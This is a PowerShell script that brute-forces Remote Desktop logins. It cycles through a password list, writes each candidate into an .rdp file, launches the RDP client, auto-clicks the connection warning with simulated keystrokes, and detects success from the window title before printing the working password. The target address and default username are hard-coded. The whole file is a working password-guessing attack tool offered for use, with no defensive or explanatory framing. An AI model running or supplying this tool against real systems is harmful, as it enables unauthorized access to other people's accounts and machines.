. .\hash-password.ps1

<# Brute forces a rdp connection using pre built files , might be slower , can it can be distributed easily#>
function setParams()
{   
    param([parameter(Mandatory=$true)][string]$password,[string]$ip,[string]$username='RC1140')
	#Always edit a filed called remoteServer as this is the template wecm use
    $pass = encryptPassword -password $password
	$rdpFile = gc .\remoteServer.rdp
	$addressSection = "full address:s:$ip"
    $usernameSection = "username:s:$username"
    $passwordSection = "password 51:b:$pass"
	$rdpFile[0] = $addressSection
    $rdpFile[1] = $usernameSection
    $rdpFile[2] = $passwordSection
	sc .\remoteServer.rdp $rdpFile
}


function testConnection()
{
	param($ip,$password,$firstTry)
	if($firstTry -eq "y"){
		Add-Type -assembly Microsoft.VisualBasic
		if($ip)
        {
            if($password)
            {
                setParams -ip $ip -password $password
            }
        }
		invoke-expression '.\remoteServer.rdp'
		#Wait a second to the rdp to make a connection
		sleep 2
		[Microsoft.VisualBasic.Interaction]::AppActivate("Remote Desktop Connection")
		#Accept the default warning , which asks if you want to really connect to this server
		[System.Windows.Forms.SendKeys]::SendWait("+{TAB}+{TAB}+{TAB}+{TAB}+{TAB}+{TAB}+{TAB}")
		[System.Windows.Forms.SendKeys]::SendWait(" {ENTER}")
		#Only use the line below to check if there was a valid connection made
		#if there was the title will contain the ip of the pc we are connecting to
		
		sleep 2
		$title = ps mstsc |%{$_.mainwindowtitle}
		$count = 0
		while(-not $title -match $ip)
		{
			$count++;
			sleep 2;
			if($count -eq 10)
			{
				break;
			}
		}
		
		if($title -match $ip)
		{
			write-host "Connection Succeded :)"
            write-host "Password : $password"
            $true
		}
		else
		{
			write-host "Did not find server pass"
			#Kill any remaining rdp's if a connection wasnt made
			ps mstsc | kill		
            $false
		}
	}
	else
	{
		if($ip)
		{
            if($password)
            {
                setParams -ip $ip -password $password
            }
		}
		else
		{
			$rdpFile = gc .\remoteServer.rdp
			$ip = $rdpFile[0].Substring(15)
		}
		invoke-expression '.\remoteServer.rdp'
		sleep 2
		$title = ps mstsc |%{$_.mainwindowtitle}
		$count = 0
		while(-not $title -match $ip)
		{
			$count++;
			sleep 2;
			if($count -eq 10)
			{
				break;
			}
		}
		
		
		if($title -match $ip)
		{
			write-host "Connection Succeded :)"
            write-host "Password : $password"
            $true
		}
		else
		{
			write-host "Did not find server pass"
			#Kill any remaining rdp's if a connection wasnt made
			ps mstsc | kill		
            $false
		}
	}
}

function run()
{
    #$firstTry = read-host "Is this the first time connecting to this server (y/n)"
	#$ip = read-host "Enter the ip of the server you are trying to connect to"
    $count = 0
    $passwords = gc .\PasswordList.txt
    $server = '192.168.233.1'
    $connected = testConnection -password $passwords[$count] -ip $server -firstTry 'y'
    while(!$connected -and $passwords[$count])
    {
        $count++
        
        $connected = testConnection -password $passwords[$count] -ip $server -firstTry 'n'
    }
}

. run